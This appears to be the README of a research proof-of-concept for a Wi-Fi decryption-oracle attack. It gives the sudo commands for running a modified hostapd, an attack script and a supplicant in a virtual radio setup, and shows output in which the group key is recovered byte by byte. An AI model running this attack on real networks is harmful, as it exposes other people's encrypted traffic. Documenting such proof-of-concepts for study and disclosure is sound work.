# Decryption Oracle Test

To prepare the proof-of-concept for execution in a virtual environment, run `./initradios.sh`.
Now open three different terminals, and in each of them execute:

	sudo ./hostapd.sh
	sudo ./attack.py
	sudo ./supplicant.sh

The output of attack.py will be:

	WARNING: Failed to execute tcpdump. Check it is installed and in the PATH
	WARNING: No route found for IPv6 destination :: (no default route?)
	Guessing position 31 value 0x0
	Guessing position 31 value 0x1
	Recovered value 1 at position 31 ==> GTK so far = [1]
	Guessing position 30 value 0x0
	Recovered value 0 at position 30 ==> GTK so far = [0, 1]
	Guessing position 29 value 0x0
	Guessing position 29 value 0x1
	Guessing position 29 value 0x2
	Recovered value 2 at position 29 ==> GTK so far = [2, 0, 1]
	Guessing position 28 value 0x0
	Guessing position 28 value 0x1
	Recovered value 1 at position 28 ==> GTK so far = [1, 2, 0, 1]
	Guessing position 27 value 0x0
	Recovered value 0 at position 27 ==> GTK so far = [0, 1, 2, 0, 1]
	Guessing position 26 value 0x0
	...

Note that hostapd was modified to use the static group key "00 01 02 00 01 02 00 01 02 00 01 02 00 01 02 00 01 02 00 01 02 00 01 02 00 01 02 00 01 02 00 01" in the above example output.
